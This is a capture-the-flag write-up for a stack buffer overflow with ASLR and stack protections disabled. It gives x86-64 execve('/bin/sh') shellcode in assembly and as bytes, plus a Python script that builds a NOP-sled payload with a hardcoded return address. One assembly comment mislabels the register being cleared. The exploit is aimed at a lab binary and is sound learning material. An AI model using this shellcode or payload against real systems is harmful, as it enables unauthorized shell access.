
## Configuration

Need to disable ASLR, stack protection, and canaries.

Disable ASLR with: `echo 0 > /proc/sys/kernel/randomize_va_space`


## Writeup

We write assembly shellcode that will call execve into the stack and then overwrite the return address of the function to point back to this shellcode on the stack.

To do this, we write a large nop sled and then the shellcode followed by filler and then the return address. We need to use the nop sled because we might not know the exact return address. Since ASLR is disables, it won't be too large a disparity so some trial and error should let us pwn the program.

The shellcode was crafter as such:

```asm
xor     rdx, rdx                ;Clear rax register
mov     qword rbx, '//bin/sh'   ;Move /bin//sh to rbx
shr     rbx, 0x8                ;Add null byte to end of string
push    rbx                     ;Push /bin//sh to stack
mov     rdi, rsp                ;Load address of /bin//sh to rdi
push    rdx                     ;Push null byte to stack to end argv array
sub     rsp, $8
mov     [rsp], rdi              ;Push address of /bin//sh to stack (push command was crashing)
mov     rsi, rsp                ;Load address of address of /bin//sh to rsi
mov     al, 0x3b                ;syscall number of execve is 59
syscall                         ;Call execve
```

and the python code to craft the input is here

```python
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48\x89\xe6\xb0\x3b\x0f\x05"
ret_adr = "\xd5\xe8\xff\xff\xff\x7f\x00\x00"

nop_len = 500
payload = "\x90"*nop_len + shellcode + "a"*(0x400 - len(shellcode) - nop_len) + "b"*8 + ret_adr

print payload
```


**flag:** treeCTF{...}